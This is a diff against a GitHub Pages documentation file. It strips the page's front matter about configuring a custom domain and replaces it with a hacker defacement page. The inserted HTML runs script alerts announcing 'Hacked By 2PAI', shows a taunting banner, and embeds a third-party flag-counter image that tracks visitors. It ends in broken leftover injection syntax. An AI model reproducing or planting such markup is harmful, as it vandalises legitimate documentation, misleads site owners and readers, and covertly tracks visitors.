@@ -1,27 +1,16 @@
----
-title: Configuring a custom domain for your GitHub Pages site
-intro: 'You can customize the domain name of your {% data variables.product.prodname_pages %} site.'
-redirect_from:
-  - /articles/tips-for-configuring-an-a-record-with-your-dns-provider
-  - /articles/adding-or-removing-a-custom-domain-for-your-github-pages-site
-  - /articles/configuring-an-a-record-with-your-dns-provider
-  - /articles/using-a-custom-domain-with-github-pages
-  - /articles/tips-for-configuring-a-cname-record
-  - /articles/setting-up-a-custom-domain-with-pages
-  - /articles/setting-up-a-custom-domain-with-github-pages
-  - /articles/configuring-a-custom-domain-for-your-github-pages-site
-  - /github/working-with-github-pages/configuring-a-custom-domain-for-your-github-pages-site
-product: '{% data reusables.gated-features.pages %}'
-versions:
-  fpt: '*'
-  ghec: '*'
-topics:
-  - Pages
-children:
-  - /about-custom-domains-and-github-pages
-  - /managing-a-custom-domain-for-your-github-pages-site
-  - /verifying-your-custom-domain-for-github-pages
-  - /troubleshooting-custom-domains-and-github-pages
-shortTitle: Configure a custom domain
----
-
+<html>
+<head>
+	<script> 
+     alert("Hacked By 2PAI"); 
+     alert("Helo Admin, Please Fix Your Website.!!");
+</script>
+<title>Hacked by 2PAI</title>
+</head>
+<body bgcolor="black" >
+<center><font face="Courier new" size="24" color="lime"> Whoami? 2PAI </font>
+</body>
+<p
+<a href="https://info.flagcounter.com/m1ra"><img src="https://s05.flagcounter.com/count2/m1ra/bg_black/txt_000000/border_CCCCCC/columns_2/maxflags_100/viewers_0/labels_0/pageviews_0/flags_0/percent_0/" alt="Flag Counter" border="0"></a>
+<p />
+</html>'))
+</script>
